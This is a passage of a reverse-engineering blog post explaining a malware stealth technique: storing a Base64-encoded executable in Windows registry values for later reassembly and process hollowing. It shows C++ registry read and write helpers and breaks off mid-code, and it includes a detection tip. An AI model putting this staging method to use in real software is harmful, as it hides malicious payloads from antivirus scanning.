<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">

<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

	<title>Stealth Techniques: Hiding Files in the Registry &laquo;  RCE Endeavors</title>

	<style type="text/css" media="screen">
		@import url( https://www.codereversing.com/wp-content/themes/classic/style.css );
	</style>

	<link rel="pingback" href="https://www.codereversing.com/xmlrpc.php" />
		<link rel='archives' title='June 2023' href='https://www.codereversing.com/archives/date/2023/06' />
	<link rel='archives' title='May 2023' href='https://www.codereversing.com/archives/date/2023/05' />
	<link rel='archives' title='October 2022' href='https://www.codereversing.com/archives/date/2022/10' />
	<link rel='archives' title='August 2022' href='https://www.codereversing.com/archives/date/2022/08' />
	<link rel='archives' title='July 2022' href='https://www.codereversing.com/archives/date/2022/07' />
	<link rel='archives' title='June 2022' href='https://www.codereversing.com/archives/date/2022/06' />
	<link rel='archives' title='December 2021' href='https://www.codereversing.com/archives/date/2021/12' />
	<link rel='archives' title='November 2021' href='https://www.codereversing.com/archives/date/2021/11' />
	<link rel='archives' title='October 2021' href='https://www.codereversing.com/archives/date/2021/10' />
	<link rel='archives' title='May 2021' href='https://www.codereversing.com/archives/date/2021/05' />
	<link rel='archives' title='March 2017' href='https://www.codereversing.com/archives/date/2017/03' />
	<link rel='archives' title='February 2017' href='https://www.codereversing.com/archives/date/2017/02' />
	<link rel='archives' title='December 2015' href='https://www.codereversing.com/archives/date/2015/12' />
	<link rel='archives' title='September 2015' href='https://www.codereversing.com/archives/date/2015/09' />
	<link rel='archives' title='August 2015' href='https://www.codereversing.com/archives/date/2015/08' />
	<link rel='archives' title='July 2015' href='https://www.codereversing.com/archives/date/2015/07' />
	<link rel='archives' title='June 2015' href='https://www.codereversing.com/archives/date/2015/06' />
	<link rel='archives' title='May 2015' href='https://www.codereversing.com/archives/date/2015/05' />
	<link rel='archives' title='April 2015' href='https://www.codereversing.com/archives/date/2015/04' />
	<link rel='archives' title='March 2015' href='https://www.codereversing.com/archives/date/2015/03' />
	<link rel='archives' title='January 2015' href='https://www.codereversing.com/archives/date/2015/01' />
	<link rel='archives' title='December 2014' href='https://www.codereversing.com/archives/date/2014/12' />
	<link rel='archives' title='November 2014' href='https://www.codereversing.com/archives/date/2014/11' />
	<link rel='archives' title='June 2014' href='https://www.codereversing.com/archives/date/2014/06' />
	<link rel='archives' title='May 2014' href='https://www.codereversing.com/archives/date/2014/05' />
	<link rel='archives' title='April 2014' href='https://www.codereversing.com/archives/date/2014/04' />
	<link rel='archives' title='December 2013' href='https://www.codereversing.com/archives/date/2013/12' />
	<link rel='archives' title='July 2011' href='https://www.codereversing.com/archives/date/2011/07' />
	<link rel='archives' title='June 2011' href='https://www.codereversing.com/archives/date/2011/06' />
	<link rel='archives' title='May 2011' href='https://www.codereversing.com/archives/date/2011/05' />
	<link rel='archives' title='April 2011' href='https://www.codereversing.com/archives/date/2011/04' />
	<link rel='archives' title='March 2011' href='https://www.codereversing.com/archives/date/2011/03' />
	<link rel='archives' title='February 2011' href='https://www.codereversing.com/archives/date/2011/02' />
	<link rel='archives' title='January 2011' href='https://www.codereversing.com/archives/date/2011/01' />
		<meta name='robots' content='max-image-preview:large' />
<link rel="alternate" type="application/rss+xml" title="RCE Endeavors &raquo; Feed" href="https://www.codereversing.com/feed" />
<link rel="alternate" type="application/rss+xml" title="RCE Endeavors &raquo; Comments Feed" href="https://www.codereversing.com/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="RCE Endeavors &raquo; Stealth Techniques: Hiding Files in the Registry Comments Feed" href="https://www.codereversing.com/archives/261/feed" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.codereversing.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://www.codereversing.com/wp-includes/css/dist/block-library/style.min.css?ver=6.7' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='twttr_stylesheet-css' href='https://www.codereversing.com/wp-content/plugins/twitter-plugin/css/style.css?ver=2.66' type='text/css' media='all' />
<link rel='stylesheet' id='wp-syntax-css-css' href='https://www.codereversing.com/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2' type='text/css' media='all' />
<link rel='stylesheet' id='easy_table_style-css' href='https://www.codereversing.com/wp-content/plugins/easy-table/themes/default/style.css?ver=1.6' type='text/css' media='all' />
<script type="text/javascript" src="https://www.codereversing.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.codereversing.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://www.codereversing.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.codereversing.com/wp-json/wp/v2/posts/261" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.codereversing.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7" />
<link rel="canonical" href="https://www.codereversing.com/archives/261" />
<link rel='shortlink' href='https://www.codereversing.com/?p=261' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.codereversing.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.codereversing.com%2Farchives%2F261" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.codereversing.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.codereversing.com%2Farchives%2F261&#038;format=xml" />
<!-- Analytics by WP Statistics v14.11.2 - https://wp-statistics.com -->
</head>

<body class="post-template-default single single-post postid-261 single-format-standard">
<div id="rap">
<h1 id="header">
	<a href="https://www.codereversing.com/">RCE Endeavors</a>
	<span id="tagline">&#x1f605;</span>
</h1>

<div id="content">
<!-- end header -->


<h2>August 12, 2015</h2>
<div class="post-261 post type-post status-publish format-standard hentry category-genx86 category-programming" id="post-261">
	 <h3 class="storytitle"><a href="https://www.codereversing.com/archives/261" rel="bookmark">Stealth Techniques: Hiding Files in the Registry</a></h3>
	<div class="meta">Filed under: <a href="https://www.codereversing.com/archives/category/genx86" rel="category tag">General x86</a>,<a href="https://www.codereversing.com/archives/category/programming" rel="category tag">Programming</a> &#8212;  admin @ 12:36 PM </div>

	<div class="storycontent">
		<div class="twttr_buttons"><div class="twttr_twitter">
					<a href="http://twitter.com/share?text=Stealth+Techniques%3A+Hiding+Files+in+the+Registry" class="twitter-share-button" data-via="" data-hashtags=""  data-size="default" data-url="https://www.codereversing.com/archives/261"  data-related="" target="_blank">Tweet</a>
				</div><div class="twttr_followme">
						<a href="https://twitter.com/codereversing" class="twitter-follow-button" data-size="default"  data-show-screen-name="false"  target="_blank">Follow me</a>
					</div></div><p>This post will cover the topic of a semi-common malware technique: hiding executable data in the Windows registry. This involves writing either part of, or an entire, executable into the registry and loading it to execute later. This technique aims at stealth by not tying the potential malicious functionality to a binary; instead the functionality can be scatted across the Windows registry under many keys, making it harder to detect. The actual data, the executable code that will be loaded in these keys, can be (re)-encoded an arbitrary amount of times to make signature scanning more difficult. A good detection strategy here would be to look for the process loading the data rather than scan the registry itself.</p>
<p><strong>Storing Files in the Registry</strong></p>
<p>The first part involves getting a file into the registry. For this example, an entire file will be split up and written in parts under a single key. In the next sections, this file will be retrieved, combined, and lastly executed in a hollowed process. There are several ways to go about doing this in terms of how the file will actually be stored in the registry. The registry has different <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724884%28v=vs.85%29.aspx" target="_blank">value types</a> that can store a variety of types of data, ranging from raw binary data, 32/64-bit values, and strings. For this example, the file will be Base64 encoded and written as string (<em>REG_SZ</em>) values.</p>
<p>Getting data into the registry is pretty straightforward. It involves opening a handle to the key with <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724844%28v=vs.85%29.aspx" target="_blank">RegCreateKeyEx</a>, which opens a handle to an existing key or creates a new one, followed by calling <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724868%28v=vs.85%29.aspx" target="_blank">RegGetValue</a> and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx" target="_blank">RegSetValueEx</a> to perform reads and writes. The example code below shows these three operations:</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="cpp" style="font-family:monospace;"><span style="color: #0000ff;">const</span> HKEY OpenRegistryKey<span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> strKeyName, <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">bool</span> bCreate <span style="color: #000080;">=</span> <span style="color: #0000ff;">true</span><span style="color: #008000;">&#41;</span>
<span style="color: #008000;">&#123;</span>
    HKEY hKey <span style="color: #000080;">=</span> <span style="color: #0000ff;">nullptr</span><span style="color: #008080;">;</span>
    DWORD dwResult <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>
&nbsp;
    LONG lRet <span style="color: #000080;">=</span> RegCreateKeyExA<span style="color: #008000;">&#40;</span>HKEY_CURRENT_USER, strKeyName, <span style="color: #0000dd;">0</span>,
        <span style="color: #0000ff;">nullptr</span>, <span style="color: #0000dd;">0</span>, KEY_READ <span style="color: #000040;">|</span> KEY_WRITE <span style="color: #000040;">|</span> KEY_CREATE_SUB_KEY,
        <span style="color: #0000ff;">nullptr</span>, <span style="color: #000040;">&amp;</span>hKey, <span style="color: #000040;">&amp;</span>dwResult<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>lRet <span style="color: #000040;">!</span><span style="color: #000080;">=</span> ERROR_SUCCESS<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #0000dd;">fprintf</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">stderr</span>, <span style="color: #FF0000;">&quot;Could not create/open registry key. Error = %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span>,
            lRet<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        <span style="color: #0000dd;">exit</span><span style="color: #008000;">&#40;</span><span style="color: #000040;">-</span><span style="color: #0000dd;">1</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>bCreate <span style="color: #000040;">&amp;&amp;</span> dwResult <span style="color: #000080;">==</span> REG_CREATED_NEW_KEY<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #0000dd;">fprintf</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">stdout</span>, <span style="color: #FF0000;">&quot;Created new registry key.<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
    <span style="color: #0000ff;">else</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #0000dd;">fprintf</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">stdout</span>, <span style="color: #FF0000;">&quot;Opened existing registry key.<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    <span style="color: #0000ff;">return</span> hKey<span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span>
&nbsp;
<span style="color: #0000ff;">void</span> WriteRegistryKeyString<span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> HKEY hKey, <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> strValueName,
    <span style="color: #0000ff;">const</span> BYTE <span style="color: #000040;">*</span>pBytes, <span style="color: #0000ff;">const</span> DWORD dwSize<span style="color: #008000;">&#41;</span>
<span style="color: #008000;">&#123;</span>
    std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> strEncodedData <span style="color: #000080;">=</span> base64_encode<span style="color: #008000;">&#40;</span>pBytes, dwSize<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    LONG lRet <span style="color: #000080;">=</span> RegSetValueExA<span style="color: #008000;">&#40;</span>hKey, strValueName, <span style="color: #0000dd;">0</span>, REG_SZ, <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> BYTE <span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span>strEncodedData.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, strEncodedData.<span style="color: #007788;">length</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>lRet <span style="color: #000040;">!</span><span style="color: #000080;">=</span> ERROR_SUCCESS<span style="color: #008000;">&#41;</span>
    <span style="color: #008000;">&#123;</span>
        <span style="color: #0000dd;">fprintf</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">stderr</span>, <span style="color: #FF0000;">&quot;Could not write registry value. Error = %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span>,
            lRet<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        <span style="color: #0000dd;">exit</span><span style="color: #008000;">&#40;</span><span style="color: #000040;">-</span><span style="color: #0000dd;">1</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
<span style="color: #008000;">&#125;</span>
&nbsp;
<span style="color: #0000ff;">const</span> std<span style="color: #008080;">::</span><span style="color: #007788;">array</span><span style="color: #000080;">&lt;</span>BYTE, READ_WRITE_SIZE<span style="color: #000080;">&gt;</span> ReadRegistryKeyString<span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> strKeyName,
    <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> <span style="color: #000040;">*</span> <span style="color: #0000ff;">const</span> strValueName, <span style="color: #0000ff;">bool</span> <span style="color: #000040;">&amp;</span>bErrorOccured<span style="color: #008000;">&#41;</span>
<span style="color: #008000;">&#123;</span>
    DWORD dwType <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">const</span> DWORD dwMaxReadSize <span style="color: #000080;">=</span> READ_WRITE_SIZE <span style="color: #000040;">*</span> <span style="color: #0000dd;">2</span><span style="color: #008080;">;</span>
    DWORD dwReadSize <span style="color: #000080;">=</span> dwMaxReadSize<span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">char</span> strBytesEncoded<span style="color: #008000;">&#91;</span>READ_WRITE_SIZE <span style="color: #000040;">*</span> <span style="color: #0000dd;">2</span><span style="color: #008000;">&#93;</span> <span style="color: #000080;">=</span> <span style="color: #008000;">&#123;</span> <span style="color: #0000dd;">0</span> <span style="color: #008000;">&#125;</span><span style="color: #008080;">;</span>
&nbsp;
    LONG lRet <span style="color: #000080;">=</span> RegGetValueA<span style="color: #008000;">&#40;</span>HKEY_CURRENT_USER, strKeyName, strValueName,
        RRF_RT_REG_SZ, <span style="color: #000040;">&amp;</span>dwType, strBytesEncoded, <span style="color: #000040;">&amp;</span>dwReadSize<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    std<span style="color: #008080;">::</span><span style="color: #007788;">array</span><span style="color: #000080;">&lt;</span>BYTE, READ_WRITE_SIZE<span style="color: #000080;">&gt;</span> pBytes <span style="color: #000080;">=</span> <span style="color: #008000;">&#123;</span> <span style="color: #0000dd;">0</span> <span style="color: #008000;">&#125;</span><span style="color: #008080;">;</span>
    std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> strDecoded <span style="color: #000080;">=</span> base64_decode<span style="color: #008000;">&#40;</span>std<span style="color: #008080;">::</span><span style="color: #007788;">string</span><span style="color: #008000;">&#40;</span>strBytesEncoded<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
